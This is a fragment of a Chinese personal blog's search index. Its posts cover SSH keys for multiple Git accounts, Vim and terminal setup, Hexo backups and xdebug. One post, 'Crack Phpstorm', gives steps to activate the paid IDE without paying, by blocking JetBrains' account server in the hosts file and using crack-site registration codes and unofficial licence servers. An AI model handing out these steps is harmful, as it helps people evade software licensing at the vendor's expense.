由于不存在函数签名的概念，JS函数不能重载。","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[]},{"title":"SSH & Git","slug":"SSH-Git","date":"2017-05-02T14:46:07.000Z","updated":"2018-11-10T03:51:44.314Z","comments":true,"path":"2017/05/02/SSH-Git/","link":"","permalink":"http://maskhed.github.io/2017/05/02/SSH-Git/","excerpt":"利用SSH，在登录Git服务器的时候实现免密码登录。","text":"利用SSH，在登录Git服务器的时候实现免密码登录。 一、单用户情况： 使用固定PC登录固定git服务器，不涉及多个账号或不同git服务器： 1.运行 ssh-keygen -t rsa -C “xxx@xxx.xxx“ 2.提示输入key的名字，使用默认id_rsa即可。 3.然后会提示输入口令，这里口令与Github中的密码无关，随便输入可以为空。 4.如果重命名过id_rsa，需要将新文件名添加到SSH agent中。 完成后在.ssh/目录下可以看到id_rsa、id_rsa.pub两个文件，之后登陆git服务器，将id-rsa.pub中的内容作为公钥添加至git服务器 。 输入以下命令进行验证，若返回正常则添加成功。1ssh -vT git@gitserver.xxx 二、多账户情况 涉及多账户情况下，针对每个账户都需要一对公私钥。这就需要在使用ssh-keygen创建秘钥时进行重命名。具体如下： 1.新建user2的SSH Key12345#新建SSH key：$ cd ~/.ssh ssh-keygen -t rsa -C \"xxx@xxx.xxx\" # 重命名为id_oschina_rsaEnter file in which to save the key (~/.ssh/id_rsa): id_oschina_rsa 2.新密钥添加到SSH agent中 因为默认只读取id_rsa，为了让SSH识别新的私钥，需将其添加到SSH agent中：1ssh-add ~/.ssh/id_oschina_rsa 3.修改~/.ssh目录下的config文件，若没有则创建（touch config），我的config配置如下：12345678910111213# Default github userHost github.comHostName github.comUser gitIdentityFile ~/.ssh/id_github_rsa# second user# 可以是同一服务器的不同用户，也可以是不同服务器的用户，# 通过 Host、HostName、User区分Host oschina.netHostName oschina.netUser gitIdentityFile ~/.ssh/id_oschina_rsa 4.cat ~/.ssh/id_xxx_rsa.pub文件，将每个用户的公钥都添加至对应的git服务器中。 5.测试：12345$ ssh -T git@github.comHi git! You've successfully authenticated, but GitHub does not provide shell access.$ ssh -T git@git.oschina.netWelcome to Git@OSC, git! 6.附：删除原有ssh秘钥1ssh-keygen -R 192.168.1.203(你远程服务器的IP)","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://maskhed.github.io/tags/Hexo/"}]},{"title":"Vim折腾记","slug":"Vim折腾记","date":"2017-05-01T15:30:59.000Z","updated":"2018-11-10T03:52:17.554Z","comments":true,"path":"2017/05/01/Vim折腾记/","link":"","permalink":"http://maskhed.github.io/2017/05/01/Vim折腾记/","excerpt":"最近开始使用Ubuntu，决定折腾折腾上古神器Vim，打造属于自己的IDE。","text":"最近开始使用Ubuntu，决定折腾折腾上古神器Vim，打造属于自己的IDE。 1.TerminalMac下选iTerm2，Ubuntu下选用Terminator，至于为什么选择这两款Terminal网上讨论很多。这两款Terminal不仅可以按照自己的喜好设置配色方案，而且新建Tab、分屏等功能，极大的提高了工作效率。附上常用快捷键方便查阅： iTerm2(官方文档) 1234567⌘ + t //新建标签⌘ + 数字 //在各 tab 间切换⌘ + f //所查找的内容会被自动复制⌘ + d //水平分屏⌘ + shift + d //垂直分屏ctrl + u //清空当前行，无论光标在什么位置⌘ + shift + h //列出剪切板历史 Terminator (可以通过 “man terminator”查阅帮助文档) 1234567891011121314151617//标签内的操作 Alt+Up/Down/Left/Right //移动到 上/下/左/右 的终端 Ctrl+Shift+O //水平分割终端 Ctrl+Shift+E //垂直分割终端 Ctrl+Shift+F //搜索 Ctrl+Shift+C //复制选中的内容到剪贴板 Ctrl+Shift+V //粘贴剪贴板的内容到此处 Ctrl+Shift+W //关闭当前终端 Ctrl+Shift+Q //退出当前窗口，当前窗口的所有终端都将被关闭 Ctrl+Shift+X //最大化显示当前终端 Ctrl+Tab //移动到下一个终端 //标签之间的操作 F11 //全屏开关 Ctrl+Shift+T //打开一个新的标签 Ctrl+PageDown //移动到下一个标签 Ctrl+PageUp //移动到上一个标签 Ctrl+Shift+G //重置终端状态并clear屏幕 2.Shell 确定好Terminal之后，选择shell，使用传说中的终极shell–zsh，并用开源项目Oh My Zsh简化设置。安装完毕后，可以在.zshrc中选择喜欢的主题、插件以及个性化设置。详情可以查阅官方文档. 0x01 Vim 基础1.基本配置（.vimrc）script1234567891011121314151617181920212223242526272829303132333435363738394041424344\"显示行号set nu\"语法高亮syntax on\"不需要备份set nobackup\"没有保存或文件只读时弹出确认set confirm\"鼠标可用set mouse=a\"tab缩进set tabstop=4set shiftwidth=4set expandtabset smarttab\"c文件自动缩进set cindent\"自动对齐set autoindent\"智能缩进set smartindent\"高亮查找匹配set hlsearch\"显示匹配set showmatch\"显示标尺，就是在右下角显示光标位置set ruler\"启动显示状态行set laststatus=2\"显示输入的命令set showcmd 2.常用命令 未完待续…","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[{"name":"Vim","slug":"Vim","permalink":"http://maskhed.github.io/tags/Vim/"}]},{"title":"Hexo 多PC同步及备份","slug":"hexo-多PC同步及备份","date":"2017-04-26T15:06:34.000Z","updated":"2018-11-10T03:49:29.703Z","comments":true,"path":"2017/04/26/hexo-多PC同步及备份/","link":"","permalink":"http://maskhed.github.io/2017/04/26/hexo-多PC同步及备份/","excerpt":"解决异地及多PC之间同步问题。Git服务器的选择，github &amp; oschina。gtihub用于发布，oschina用于备份blog源码，因为oschina提供免费的私有仓库。","text":"解决异地及多PC之间同步问题。Git服务器的选择，github &amp; oschina。gtihub用于发布，oschina用于备份blog源码，因为oschina提供免费的私有仓库。 0x 01 搭建并发布Hexo 简易搭建并发布Hexo的步骤可以参考hexo搭建步骤 0x 02 备份Blog 2.1 oschina注册并创建仓库 在git.oschina.net注册账号，并创建私有仓库。（如：xxx.github.io） 2.2 创建本地仓库 首先，删除除.gitignore所包含的目录以外的所有子目录中的.git目录，由于.git目录中包含原仓库的信息，会与新建仓库产生冲突。之后，在Hexo根目录下： 1git init 创建.gitignore文件，并编辑如下： 123/.deploy_git/node_modules/public .deploy_git: Hexo默认的.git目录，不需要备份 node_modules: npm install生成的插件等，不需要备份 plublic: 每次发布时自动生成的内容，不需要备份 _config.yml: 配置文件，依个人情况选择是否备份 2.3 添加备份并上传 12345$ git status$ git add --all$ git commit -m \"xxx\"$ git remote add origin https://git.oschina.net/用户名/项目名.git$ git push -u origin master 0x 03 异地同步 从oschina获取最新的Blog备份: git pull 本地编辑并发布 备份最新的Blog至oschina: git push","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://maskhed.github.io/tags/Hexo/"}]},{"title":"Crack Phpstorm","slug":"Crack-Phpstorm","date":"2017-04-25T21:29:18.000Z","updated":"2018-11-10T03:47:11.732Z","comments":true,"path":"2017/04/26/Crack-Phpstorm/","link":"","permalink":"http://maskhed.github.io/2017/04/26/Crack-Phpstorm/","excerpt":"免费激活 PhpStorm。","text":"免费激活 PhpStorm。 1.官网下载PhpStorm。2.Crack hosts文件中添加”0.0.0.0 account.jetbrains.com” http://idea.lanyus.com/](http://idea.lanyus.com/) 获取注册码 在PhpStorm中输入注册码，成功激活。 3.其他激活方式 填入下面的license server: http://intellij.mandroid.cn/http://idea.imsxm.com/http://idea.iteblog.com/key.php 搭建服务器激活 参考文章：IntelliJ IDEA 注册码IntelliJ Idea 2017 免费激活方法ilanyu’s Blog","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[]},{"title":"php-debug","slug":"php-debug","date":"2017-04-24T13:03:36.000Z","updated":"2018-11-10T03:50:11.554Z","comments":true,"path":"2017/04/24/php-debug/","link":"","permalink":"http://maskhed.github.io/2017/04/24/php-debug/","excerpt":"那些年，填过的坑","text":"那些年，填过的坑 1、php7.0 &amp;&amp; xdebug stack actually had that problem and took me allot of time to figure out the solution: (if any previous php versions where installed, make sure to first get completely rid of them. if necessary purge and reinstall apache2 and php7) first: sudo apt-get install php-xdebug then edit the php.ini file of php 7 : sudo gedit /etc/php/7.0/apache2/php.ini and just on the bottom add: xdebug.remote_enable = On save and of course then: sudo service apache2 restart","categories":[{"name":"杂货铺","slug":"杂货铺","permalink":"http://maskhed.github.io/categories/杂货铺/"}],"tags":[]}]}